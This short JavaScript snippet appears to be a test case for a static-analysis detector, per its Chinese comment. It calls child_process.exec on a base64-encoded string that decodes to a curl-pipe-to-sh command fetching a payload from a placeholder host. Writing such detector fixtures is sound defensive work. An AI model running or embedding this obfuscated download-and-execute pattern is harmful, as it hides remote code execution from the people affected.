const cp = require('child_process')
// M25：N2 解码实参形态——Buffer.from(base64) 还原出 curl|sh（R20 decodedFrom 击杀面）
cp.exec(Buffer.from('Y3VybCAtcyBodHRwOi8veC9wLmJpbiB8IHNo', 'base64'))